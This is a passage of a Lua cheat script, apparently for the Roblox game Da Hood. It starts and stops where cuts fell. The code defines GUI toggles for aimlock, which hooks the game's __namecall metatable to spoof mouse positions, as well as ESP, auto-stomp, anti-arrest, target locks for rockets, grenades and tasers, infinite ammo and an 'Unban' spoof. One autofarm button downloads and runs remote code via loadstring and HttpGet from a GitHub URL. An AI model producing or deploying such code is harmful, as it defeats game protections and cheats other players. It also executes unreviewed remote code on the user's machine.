            local forbidden = {'[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
            local Found = false
            for _,v in pairs(game.Workspace.Players:GetChildren()) do
                if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= MaxDistance then
                    if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name and v.Name == hostusername then
                        Found = true
                        if mimicing == true then
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
end
                    end
                end
            end
            if Found == false and HoldingF == false then
                a = true
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until peenesspesnispesnisbig == false
        Pause()
    else
        AutoBlockColor.BackgroundColor3 = red
    end
end)

AutoStompColor.BackgroundColor3 = red
AutoStomp.MouseButton1Click:Connect(function()
    if AutoStompColor.BackgroundColor3 == red then
        AutoStompColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            MainEvent:FireServer('Stomp')
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AutoStompColor.BackgroundColor3 == red
        Pause()
    else
        AutoStompColor.BackgroundColor3 = red
    end
end)

AntiArrestColor.BackgroundColor3 = red
AntiArrest.MouseButton1Click:Connect(function()
    if AntiArrestColor.BackgroundColor3 == red then
        AntiArrestColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
                for _,v in pairs(game:GetService('Players'):GetChildren()) do
                    if v.Character and v.DataFolder.Officer.Value == 1 then
                        if (v.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 30 and player.Character.BodyEffects['K.O'].Value == true then
                            player.Character:Destroy()
                        end
                    end
                end 
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AntiArrestColor.BackgroundColor3 == red
        Pause()
    else
        AntiArrestColor.BackgroundColor3 = red
    end
end)

AutoDropColor.BackgroundColor3 = red
AutoDrop.MouseButton1Click:Connect(function()
    if AutoDropColor.BackgroundColor3 == red then
        AutoDropColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            local DropAm = 10000
            if player.DataFolder.Currency.Value > 10000 then
                DropAm = '10000'
            else
                DropAm = tostring(player.DataFolder.Currency.Value)
            end
            local args = {
                'DropMoney',
                DropAm
            }
            MainEvent:FireServer(unpack(args))
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AutoDropColor.BackgroundColor3 == red
        Pause()
    else
        AutoDropColor.BackgroundColor3 = red
    end
end)

HideUserColor.BackgroundColor3 = red
HideUser.MouseButton1Click:Connect(function()
    if HideUserColor.BackgroundColor3 == red then
        HideUserColor.BackgroundColor3 = green
        NamePos = player.Character.HumanoidRootPart.CFrame
            local Loop
            local loopFunction = function()
                local WearingMask = player.Character:FindFirstChild('In-gameMask')
                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                if not WearingMask then
                    local OwnsMask = player.Character:FindFirstChild('Mask') or player.Backpack:FindFirstChild('Mask')
                    if OwnsMask then
                        local MaskInventory = player.Backpack:FindFirstChild('Mask')
                        if MaskInventory then
                            Humanoid:EquipTool(MaskInventory)
                            wait(0.1)
                        end
                        OwnsMask:Activate()
                    else
                        local ItemName = 'Mask'
                        local ItemCost = 60
                        local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].ClickDetector
                        local Location = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].Head.Position
                        local function buy()
                            wait()
                            player.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
                            fireclickdetector(ClickDetector)
                            if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                                player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
                                player.Character.RightHand.Position = player.Character.RightLowerArm.Position
                            end
                        end
                        repeat buy() until player.Backpack:FindFirstChild(ItemName) or player.DataFolder.Currency.Value <= ItemCost or player.Character:FindFirstChild(ItemName)
                        player.Character.HumanoidRootPart.CFrame = NamePos
                        if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                            player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
                            player.Character.RightHand.Position = player.Character.RightLowerArm.Position
                        end
                    end
                else
                    local MaskVisible = player.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle')
                    if MaskVisible then
                        MaskVisible:Destroy()
                    end
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until HideUserColor.BackgroundColor3 == red
            Pause()
    else
        HideUserColor.BackgroundColor3 = red
    end
end)

AntiBagColor.BackgroundColor3 = red
AntiBag.MouseButton1Click:Connect(function()
    if AntiBagColor.BackgroundColor3 == red then
        AntiBagColor.BackgroundColor3 = green
            local Loop
            local loopFunction = function()
                if player.Character:FindFirstChild('Christmas_Sock') then
                   player.Character:FindFirstChild('Christmas_Sock'):Destroy() 
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until AntiBagColor.BackgroundColor3 == red
            Pause()
    else
        AntiBagColor.BackgroundColor3 = red
    end
end)

AltArmorColor.BackgroundColor3 = red
AltArmor.MouseButton1Click:Connect(function()
    if AltArmorColor.BackgroundColor3 == red then
        AltArmorColor.BackgroundColor3 = green
        
    else
        AltArmorColor.BackgroundColor3 = red
    end
end)

RocketRideColor.BackgroundColor3 = red
RocketRide.MouseButton1Click:Connect(function()
    if RocketRideColor.BackgroundColor3 == red then
        RocketRideColor.BackgroundColor3 = green
            local Loop
            local loopFunction = function()
                local Rocket = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
                if Rocket and COOLDOWN == true then
                    local RocketPart = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('RocketPart')
                    if not RocketPart then
                        local RocketPart = Instance.new('Part', game.Workspace.Ignored)
                        RocketPart.Name = 'RocketPart'
                        RocketPart.Anchored = true
                        RocketPart.CanCollide = true
                        RocketPart.Transparency = 1
                        RocketPart.Position = Vector3.new(Rocket.Position.X, Rocket.Position.Y + 1.4, Rocket.Position.Z)
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(RocketPart.Position.X, RocketPart.Position.Y + 2, RocketPart.Position.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
                        RIDING = true
                    else
                        RocketPart.Position = Vector3.new(Rocket.Position.X, Rocket.Position.Y + 1.4, Rocket.Position.Z)
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(RocketPart.Position.X, RocketPart.Position.Y + 2.3, RocketPart.Position.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
                        RIDING = true
                    end
                else
                    for i,v in pairs(game:GetService('Workspace'):FindFirstChild('Ignored'):GetChildren()) do
                        if v.Name == 'RocketPart' then
                           v:Destroy() 
                        end
                        RIDING = false
                    end
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until RocketRideColor.BackgroundColor3 == red
            Pause()
    else
        RocketRideColor.BackgroundColor3 = red
    end
end)

AntiGrabColor.BackgroundColor3 = red
AntiGrab.MouseButton1Click:Connect(function()
    if AntiGrabColor.BackgroundColor3 == red then
        AntiGrabColor.BackgroundColor3 = green
            local Loop
            local loopFunction = function()
                local GC = player.Character:FindFirstChild("GRABBING_CONSTRAINT")
                if GC then
                    GC:Destroy()
                    wait(0.04)
                    player.Character:FindFirstChildWhichIsA('Humanoid').Sit = true
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until AntiGrabColor.BackgroundColor3 == red
            Pause()
    else
        AntiGrabColor.BackgroundColor3 = red
    end
end)

AntiEffectsColor.BackgroundColor3 = red
AntiEffects.MouseButton1Click:Connect(function()
    if AntiEffectsColor.BackgroundColor3 == red then
        AntiEffectsColor.BackgroundColor3 = green
        player.PlayerGui.Framework.FBAnimation.Name = 'yea'
            local Loop
            local loopFunction = function()
                local Particle = player.Character.UpperTorso:FindFirstChild('ElectricuteParticle') or player.Character.UpperTorso:FindFirstChild('FlamethrowerFireParticle')
                if Particle then Particle:Destroy() end
                for i,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                    if v.Animation.AnimationId == 'rbxassetid://5641749824' then
                       v:Stop() 
                    end
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until AntiEffectsColor.BackgroundColor3 == red
            Pause()
    else
        AntiEffectsColor.BackgroundColor3 = red
        player.PlayerGui.Framework.yea.Name = 'FBAnimation'
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

--Rpg Variables--
DS = 75
DT = 5
RpgTimer = DS
Distance = DT
RPGTarget = 'None'
-----------------


local mt = getrawmetatable(game) -- aimlok
pos = Vector3.new(0,0,0)
local old = mt.__namecall
setreadonly(mt,false)
mt.__namecall = newcclosure(function(self, ...)
  local args = {...}
  if getnamecallmethod() == 'FireServer' and self.Name == 'MainEvent' then
    if tostring(args[1]) == 'UpdateMousePos' then
        if Aimlocked ~= nil then
            args[2] = pos
        end
     end
  end
  return old(self, unpack(args))
end)


Invisible.MouseButton1Click:Connect(function()
    OldInvisCFrame = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(318.499, 93.825, -919.513)
    wait(0.1)
    player.Character:BreakJoints()
    wait(0.1)
    player.Character.HumanoidRootPart.CFrame = OldInvisCFrame
end)

Spin.MouseButton1Click:Connect(function()
    if Spin.Text == 'Spin' then
        Spin.Text = 'Unspin'
        local Loop
        local loopFunction = function()
            player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(50), 0)
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until Spin.Text == 'Spin'
        Pause()
    else
        Spin.Text = 'Spin'
    end
end)

Users.MouseButton1Click:Connect(function()
    for i,v in pairs(game.Workspace.Players:GetChildren()) do
        v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
    end
    announce('Showing masked usersnames', '', 3)
end)

MoneyESP.MouseButton1Click:Connect(function()
    if MoneyESP.Text == 'MoneyESP' then
        MoneyESP.Text = 'UnmoneyESP'
        local Loop
        local loopFunction = function()
        for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if v.Name == 'MoneyDrop' then
                v.BillboardGui.AlwaysOnTop = true
                v.BillboardGui.Size = UDim2.new(0,25,0,25)
                end
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait(1) until MoneyESP.Text == 'MoneyESP'
        Pause()
    else
        MoneyESP.Text = 'MoneyESP'
        for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if v.Name == 'MoneyDrop' then
                v.BillboardGui.AlwaysOnTop = false
                v.BillboardGui.Size = UDim2.new(1,0,1,0)
            end
        end
    end 
end)

Esp.MouseButton1Click:Connect(function()
    if Esp.Text == 'Esp' then
        Esp.Text = 'Unesp'
        local Loop
        local loopFunction = function()
            for _,v in pairs(Players:GetChildren()) do
                if v.Character then
                    if not v.Character.UpperTorso:FindFirstChild('ESP') then
                        local ESP = Instance.new('BillboardGui', v.Character.UpperTorso)
                        ESP.StudsOffset = Vector3.new(0,3,0)
                        ESP.Size = UDim2.new(4,0,1,0)
                        ESP.AlwaysOnTop = true
                        ESP.Name = 'ESP'
                        local TextLabel = Instance.new('TextLabel', ESP)
                        TextLabel.Text = (v.Name ..' | ' .. v.DisplayName)
                        TextLabel.BackgroundTransparency = 1
                        TextLabel.Size = UDim2.new(1,0,1,0)
                        TextLabel.TextColor3 = green
                    end
                end
            end        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until Esp.Text == 'Esp'
        Pause()
    else
        Esp.Text = 'Esp'
        for _,v in pairs(Players:GetChildren()) do
            if v.Character then
                if v.Character.UpperTorso:FindFirstChild('ESP') then
                    v.Character.UpperTorso:FindFirstChild('ESP'):Destroy()
                end
            end
        end
    end
end)

HighTool.MouseButton1Click:Connect(function()
    if player.Character:FindFirstChildWhichIsA('Tool') then
        player.Character:FindFirstChildWhichIsA('Tool').Grip = CFrame.new(0, -12, 0, 1, 0, 0, 0, 1, 0, 0, 0, -1)
    else
        announce('HighTool Error', 'you have to be holding a tool', 5)
    end
end)

LastingBullets.MouseButton1Click:Connect(function()
    if player.Character:FindFirstChildWhichIsA('Tool') then
        if player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui') then
            player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui'):Destroy()
        else
            announce('LastingBullets Error', 'you have to be holding a gun', 5)
        end
    else
        announce('LastingBullets Error', 'you have to be holding a gun', 5)
    end
end)

Stamina.MouseButton1Click:Connect(function()
    if Stamina.Text == 'Stamina' then
        Stamina.Text = 'Unstamina'
    else
        Stamina.Text= 'Stamina'
    end
end)

SwagUsers.MouseButton1Click:Connect(function()
    local TOTAL = 0
    for i,v in pairs(game.Workspace.Players:GetChildren()) do
        if not v.UpperTorso:FindFirstChild('OriginalSize') then
            if v.Name ~= player.Name then
                TOTAL = TOTAL + 1
            end
        end
    end
    if TOTAL > 0 then
        announce('Found','A total of ' .. tostring(TOTAL) .. ' of swag mode players', 3)
    else
        announce('D:', 'no swag mode users found', 3)
    end
end)

Aimlock.MouseButton1Click:Connect(function()
    if Aimlock.Text == 'Aimlock' then
        Aimlock.Text = 'Unaimlock'
        announce('Aimlock Enabled', 'press e to aimlock', 3)
        local Loop
        local loopFunction = function()
            local enemy = game.Players:FindFirstChild(Aimlocked).Character
            if enemy then
                local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                local split = string.split(pingvalue,'(')
                local ping = tonumber(split[1]) 
                local xchange
                local zchange
                if ping < 70 then
                    increase = 0.4
                elseif ping < 140 then
                    increase = 0.57
                elseif ping < 200 then
                    increase = 0.7
                elseif ping < 350 then
                    increase = 1.2
                else 
                    increase = 1.6
                end
                if enemy.Humanoid.MoveDirection.X < 0 then
                    xchange = -increase
                elseif enemy.Humanoid.MoveDirection.X > 0 then
                    xchange = increase
                else
                    xchange = 0
                end
                if enemy.Humanoid.MoveDirection.Z < 0 then
                    zchange = -increase
                elseif enemy.Humanoid.MoveDirection.Z > 0 then
                    zchange = increase
                else
                    zchange = 0
                end
                pos = Vector3.new(enemy.Head.Position.X + enemy.Humanoid.MoveDirection.X + xchange, enemy.Head.Position.Y, enemy.Head.Position.Z + enemy.Humanoid.MoveDirection.Z + zchange)
            else
                pos = mouse.Hit.p
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until Aimlock.Text == 'Aimlock'
        Pause()
    else
        Aimlock.Text = 'Aimlock'
        Aimlocked = nil
    end
end)

AutoFarmWarning = false
Autofarm.MouseButton1Click:Connect(function()
    if AutoFarmWarning == false then
        AutoFarmWarning = true
        announce('Autofarm Warning', 'press again to begin autofarming, this CANNOT be stopped', 10)
    else
        announce('Starting Autofarm', ':D', 5)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagAutofarm"))()
    end
end)

Unban.MouseButton1Click:Connect(function()
    local localPlayer = game:GetService('Players').LocalPlayer;
    local localCharacter = localPlayer.Character;
    localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
    localCharacter:ClearAllChildren()
    local newCharacter = localPlayer.CharacterAdded:Wait();
    local spoofFolder = Instance.new('Folder');
    spoofFolder.Name = 'FULLY_LOADED_CHAR';
    spoofFolder.Parent = newCharacter;
    newCharacter:WaitForChild('RagdollConstraints'):Destroy();
    local spoofValue = Instance.new('BoolValue', newCharacter);
    spoofValue.Name = 'RagdollConstraints';
end)

FullGod.MouseButton1Click:Connect(function()

end)

        
TazerTarget = nil
GrenadeTarget = nil
LockTools.MouseButton1Click:Connect(function()
    local function rpglock()
        local RpgTool = Instance.new('Tool', player.Backpack)
        RpgTool.ToolTip = 'Click a player to rpg lock them'
        RpgTool.CanBeDropped = false
        RpgTool.RequiresHandle = false
        RpgTool.Name = 'Rpg Lock'
        
        RpgTool.Activated:Connect(function()
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    RPGTarget = LowerTorso.Parent.Parent.Parent.Name
                else
                    RPGTarget = LowerTorso.Parent.Name
                end
                announce('Rpg locked onto', RPGTarget, 3)
            else
                RPGTarget = nil
                announce('Rpg unlocked', '', 3)
            end
        end)
    end
    local function grenadelock()
        local GrenadeTool = Instance.new('Tool', player.Backpack)
        GrenadeTool.ToolTip = 'Click a player to grenade lock them'
        GrenadeTool.CanBeDropped = false
        GrenadeTool.RequiresHandle = false
        GrenadeTool.Name = 'Grenade Lock'
        
        GrenadeTool.Activated:Connect(function()
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    GrenadeTarget = LowerTorso.Parent.Parent.Parent.Name
                else
                    GrenadeTarget = LowerTorso.Parent.Name
                end
                announce('Grenades locked onto', GrenadeTarget, 5)
            else
                TazerTarget = nil
                announce('Grenades unlocked', '', 3)
            end
        end)
    end
    local function taserlock()
        local TazerTool = Instance.new('Tool', player.Backpack)
        TazerTool.ToolTip = 'Click a player to tazer lock them'
        TazerTool.CanBeDropped = false
        TazerTool.RequiresHandle = false
        TazerTool.Name = 'Tazer Lock'

        TazerTool.Activated:Connect(function()
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    TazerTarget = LowerTorso.Parent.Parent.Parent.Name
                else
                    TazerTarget = LowerTorso.Parent.Name
                end
                announce('Taser locked onto', TazerTarget, 5)
            else
                TazerTarget = nil
                announce('Taser unlocked', '', 3)
            end
        end)
    end
    
    taserlock()
    rpglock()
    grenadelock()
    
    local Loop
    local loopFunction = function()
            if RPGTarget ~= nil then
                local Launcher = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('Launcher') or game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
                local TargetRPG1 = game:GetService('Workspace').Players:FindFirstChild(RPGTarget)
                if Launcher and TargetRPG1 then
                    local TargetRPG = TargetRPG1:FindFirstChild('HumanoidRootPart')
                    if TargetRPG then
                        if RpgTimer >= 0 then
                            Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + 5, TargetRPG.Position.Z)
                            RpgTimer = RpgTimer - 1
                        else
                            Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + Distance, TargetRPG.Position.Z)
                            Distance = Distance - 1
                        end
                    else
                        RpgTimer = DS 
                        Distance = DT
                    end
                else
                    RpgTimer = DS 
                    Distance = DT
                end
            end
            if TazerTarget ~= nil then
                if player.Character:FindFirstChild('[Taser]') then
                    local Part = player.Character['[Taser]']:FindFirstChild('Handle'):FindFirstChild('Part')
                    if Part then
                        local FindPlayer = game.Workspace.Players:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') or game.Workspace:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') 
                        if FindPlayer then
                            Part.Position = FindPlayer.Position
                        end
                    end
                end
            end
            if GrenadeTarget ~= nil then
                print('lookin')
                local Handle = game.Workspace['Ignored']:FindFirstChild('Handle')
                local FindPlayer = Players:FindFirstChild(GrenadeTarget)
                if Handle and FindPlayer then
                    if FindPlayer.Character then
                        Handle.Position = FindPlayer.Character.UpperTorso.Position
                    end
                end
            end
    end;
    local Start = function()
        Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
    end;
    local Pause = function()
        Loop:Disconnect()
    end;
    Start()	
    repeat wait() until not player.Character or player.Character:FindFirstChildOfClass('Humanoid').Died == true
    Pause()
end)

InfTools.MouseButton1Click:Connect(function()
    announce('Infinite Ammo Given', 'hold the tool to buy ammo shoot without reloading', 8)
    function infrev()
        if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
        end
        
        local Gun = '[Revolver]'
        local GunTexture = 'rbxassetid://3420082920'
        local GunPath = game:GetService("Workspace").Ignored.Shop["[Revolver] - $1300"].Head
        local Holding = false
        
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Rev'
        InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
        InfiniteTool.TextureId = GunTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
        
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
        
        InfiniteTool.Equipped:Connect(function()
            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                    if v.Ammo.Value > 0 then
                        v.Parent = player.Character
                    end
                end
            end
            while Holding == true do
                wait(0)
                local TotalAmmo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(GunPath.Parent.ClickDetector)
                if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
                    player.Character:FindFirstChild(Gun).Parent = player.Backpack
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                            if v.Ammo.Value > 0 then
                                v.Parent = player.Character
                            end
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    function infdb()
        if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
        end
        
        local Gun = '[Double-Barrel SG]'
        local GunTexture = 'rbxassetid://5341886203'
        local GunPath = game:GetService("Workspace").Ignored.Shop["[Double-Barrel SG] - $1400"].Head
        local Holding = false
        
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Db'
        InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
        InfiniteTool.TextureId = GunTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
        
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
        
        InfiniteTool.Equipped:Connect(function()
            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                    if v.Ammo.Value > 0 then
                        v.Parent = player.Character
                    end
                end
            end
            while Holding == true do
                wait(0)
                local TotalAmmo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(GunPath.Parent.ClickDetector)
                if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
                    player.Character:FindFirstChild(Gun).Parent = player.Backpack
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                            if v.Ammo.Value > 0 then
                                v.Parent = player.Character
                            end
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    function infrpg()
        if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
        end
        
        local Gun = '[RPG]'
        local GunTexture = 'rbxassetid://3420083215'
        local GunPath = game:GetService("Workspace").Ignored.Shop["[RPG] - $6000"].Head
        local Holding = false
        
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Rpg'
        InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
        InfiniteTool.TextureId = GunTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
        
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
        
        InfiniteTool.Equipped:Connect(function()
